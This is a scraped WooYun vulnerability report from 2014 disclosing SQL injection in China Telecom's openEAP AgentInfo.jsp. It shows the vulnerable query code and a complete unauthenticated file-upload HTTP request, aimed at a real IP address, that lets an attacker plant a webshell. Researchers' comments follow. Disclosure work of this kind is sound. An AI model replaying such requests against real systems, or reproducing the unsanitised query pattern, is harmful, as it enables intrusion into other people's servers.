{"id": 49201, "wybug_id": "wooyun-2014-074770", "wybug_title": "中国电信全国客服openEAP通用注入加无需登录getwebshell", "wybug_corp": "中国电信", "wybug_author": "conqu3r", "wybug_date": "2014-09-02 16:01", "wybug_open_date": "2014-12-01 16:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向公众公开  简要描述： 中国电信openEAP通用注入漏洞，影响电信全国很多系统 详细说明：  中国电信openEAP的agent.war包下app\\enterprise\\AgentInfo.jsp页面，末对参数进行过滤，导致注入漏洞。\n<%\tString AId = request.getParameter(\"AgentId\"); //获取AgentID参数\tif(AId == null) AId = \"\";\tString AutoAnswer = \"true\";\tString MusicAlert = \"true\";\tString MonitorType = \"0\";\tString MonitorObject = \"1\";\tString WorkService = \"\";\tString AgentRole = \"101\";\tString CallOutLimited = \"\";\tString EntIdList = \"\";\tString EntNameList = \"\";\tif(!AId.equals(\"\")) {\t\t//查询坐席工号是否存在\t\tQueryHelper qh = new QueryHelper();\t\tString sql = \"SELECT * FROM SYS_AGENT WHERE AGENTID = '\" + AId + \"'\"; //末过滤带入查询\t\tList list = qh.executeQuery(sql); //查询\t\tif(list.size() > 0) {\t\t\tRowModel row = (RowModel)list.get(0);\t\t\tAutoAnswer = row.getColumnValue(\"AutoAnswer\");\t\t\tMusicAlert = row.getColumnValue(\"MusicAlert\");\t\t\tMonitorType = row.getColumnValue(\"MonitorType\");\t\t\tMonitorObject = row.getColumnValue(\"MonitorObject\");\t\t\tWorkService = row.getColumnValue(\"WorkService\");\t\t\tAgentRole = row.getColumnValue(\"Free1\");\t\t\tCallOutLimited = row.getColumnValue(\"Free2\");\t\t\tEntIdList = row.getColumnValue(\"Free3\");\t\t\tEntNameList = row.getColumnValue(\"Free4\");\t\t}\t}%>\n数据库：sybase。   漏洞证明：  截图：\n\n另外提下，这套系统其实不需要登录。就可以getwebshell这个不知道为什么要爆破额。 WooYun: 电信某省客服系统弱口令泄漏各种信息 无需登录上传点：\nPOST /info/servletinfo?funcid=upload HTTP/1.1Host: 202.99.225.35:9080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://202.99.225.35:9080/info/maintain/display.jsp?dsName=whinfo_ds&infoId=10&&Code=Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------184676857810583403552066782031Content-Length: 352-----------------------------184676857810583403552066782031Content-Disposition: form-data; name=\"funcid\"-----------------------------184676857810583403552066782031Content-Disposition: form-data; name=\"tt\"; filename=\"wooyun.jsp\"Content-Type: application/octet-streamtest-----------------------------184676857810583403552066782031--\n\n\n上传后的路径：/suntek_eap_info_file_dir/attach/public/wooyun.jsp\n\n   修复方案：  过滤加权限验证   版权声明：转载请注明来源 conqu3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-09-07 09:26 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-02 16:09 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  我来怒看坑总    \n     2014-09-02 16:12 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  我也来怒看坑总    \n     2014-09-02 17:37 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  静静的膜拜、、    \n     2014-09-02 17:38 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  什么情况？ 刚提交就发$？    \n     2014-09-02 17:41 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  操，错过了    \n     2014-09-02 17:48 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  什么情况？刚提交就发$？    \n     2014-09-02 18:01 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  早知道就不把漏洞提360了,周期长不说.还TMD乱定价!    \n     2014-09-02 18:03 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  以上言论纯属扯淡,别当真了    \n     2014-09-02 18:04 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  @Finger 据说通用型从提交到发钱又更给力了    \n     2014-09-02 18:12 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @magerx 必须的    \n     2014-09-02 18:14 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @magerx 牛逼阿，3个$      \n     2014-09-02 18:36 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @Finger 乌云有雄起了吗，这个是已经给钱了吗    \n     2014-09-02 18:58 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @贫道来自河北 是啊    \n     2014-09-02 21:03 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  $ $     \n     2014-09-02 23:46 |    \t\tMoogong \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 伪法医)\t\t \n  洞主的动作比我快一步啊！    \n     2014-09-03 13:48 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  @Moogong 赚点口粮钱^_^    \n     2014-12-01 19:47 |    \t\tywledoc \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 长期小打小闹)\t\t \n  坑点霸气    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}